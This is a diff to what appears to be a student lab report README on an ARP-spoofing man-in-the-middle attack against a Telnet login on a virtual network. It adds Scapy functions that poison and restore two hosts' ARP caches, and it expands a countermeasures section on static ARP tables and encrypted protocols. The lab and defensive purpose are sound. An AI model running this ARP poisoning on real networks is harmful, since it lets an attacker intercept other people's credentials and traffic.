@@ -4,6 +4,7 @@
 
 ### Introduction
 
+TODO 
 
 ### Goal of the project
 
@@ -33,16 +34,16 @@ and another machine running Ubuntu 16.04 as a server.
 
 ![VirtualBox VMs](assets/virtualbox-vm.png)
 
-Client IP is 192.168.0.42/24
+Client IP is 192.168.0.42/24.
 
 ![Client's network information](assets/client-ip.png)
 
-Client IP is 192.168.0.43/24
+Client IP is 192.168.0.43/24.
 
 ![Server's network information](assets/server-ip.png)
 
 The attacker is also connected to the network, and uses Kali Linux 
-to perform the attack. Its IP address is 192.168.0.44/24
+to perform the attack. Its IP address is 192.168.0.44/24.
 
 ![Attacker's network information](assets/kali-ip.png)
 
@@ -60,6 +61,35 @@ We are then prompted to enter login and password
 
 #### ARP Spoofing
 
+Some useful functions in the program :
+
+```python
+def get_mac(IP, interface="eth0"):
+    conf.verb = 0
+    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=IP), timeout=2, iface=interface, inter=0.1)
+    for snd, rcv in ans:
+        return rcv.sprintf(r"%Ether.src%")
+``` 
+
+```python
+def poison_arp(target1_mac, target2_mac):
+    send(ARP(op=2, pdst=target1_ip, psrc=target2_ip, hwdst=target1_mac))
+    send(ARP(op=2, pdst=target2_ip, psrc=target1_ip, hwdst=target2_mac))
+``` 
+
+```python
+def undo_arp():
+    print("\n[*] Restoring Targets...")
+    target1_mac = get_mac(target1_ip)
+    target2_mac = get_mac(target2_ip)
+    send(ARP(op=2, pdst=target2_ip, psrc=target1_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target1_mac), count=7)
+    send(ARP(op=2, pdst=target1_ip, psrc=target2_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target2_mac), count=7)
+    print("[*] Disabling IP Forwarding...")
+    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
+    print("[*] Shutting Down...")
+    sys.exit(1)
+```
+
 We can see that both client and server have their arp cache changed when our python script is running.
 
 One the client we pretend that 192.168.0.43 has the MAC address 08:00:27:d1:98:f9.
@@ -73,26 +103,51 @@ One the server we pretend that 192.168.0.42 has the MAC address 08:00:27:d1:98:f
 #### Sniffing Packet
 
 
-Note that this action can be done using Wireshark, but information retrieving might be more general, thus it could take more time to find login and password.
+Note that this action can be done using Wireshark, but information retrieving might be more general, thus it could take more time to find login and password since this software display a lot of information.
 
 ![packet sniffing using Wireshark](assets/wireshark.png)
 
 #### Information Retrieving
 
+TODO
+
 ### Countermeasures
 
-- Network Configuration
+1. Network Configuration
+    
+    - Use static ARP tables. If you're located in a private network that belongs to you, you can set 
+    it up si you cannot modify ARP tables. It will ensure that receiving wrong packets will not allow an attacker to 
+    spoof you IP address to perform such an attack.
+    - Avoid public networks. These attacks are even easier to do when their is a lot of traffic on the private network,
+    since it might allow to capture a huge amount of data, and thus has a higher probability to obtain useful packets that
+    could allow gaining important information. 
 
-- Client & Server Configuration
+2. Client & Server Configuration
+
+    - Don't use unencrypted channels to communicate over a network. Using secured protocols like SSH over Telnet,
+    and HTTPS over HTTP highly reduces the chances of this type of attack to bring useful information to the attacker.
+    
+3. Security Prevention
+
+    - Only uses what you know, and be careful of what you're doing on the net. A lot of big companies 
+    (Facebook, AirBnb, ...) have well done and secured app, it's now very difficult to gain access or information using these platform.
+     Untrusted platform might be more vulnerable to these type of attacks, since they have a less important budget allocated on security. 
+    - Since data becomes more and more difficult to steal every day, a lot of attacks are now based on phishing, i.e pretending that you're the provider of a service and 
+    thus gaining information directly from the victim, without any suspicion from him.
 
 ### Discussion
 
+TODO
+
 ### Conclusion
+
+TODO
 
 ### Sources
 
 1. [How To Do Man In The Middle Attack(MITM) with ARP Spoofing Using Python and Scapy](https://medium.com/@ravisinghmnnit12/how-to-do-man-in-the-middle-attack-mitm-with-arp-spoofing-using-python-and-scapy-441ee577ba1b)
 2. [How to Prevent ARP Spoofing Attacks?](https://www.indusface.com/blog/protect-arp-poisoning/#Identify_the_Spoofing_Attack)
+2. [Scapy Documentation](https://scapy.readthedocs.io/en/latest/)
 
 ### Appendix
 
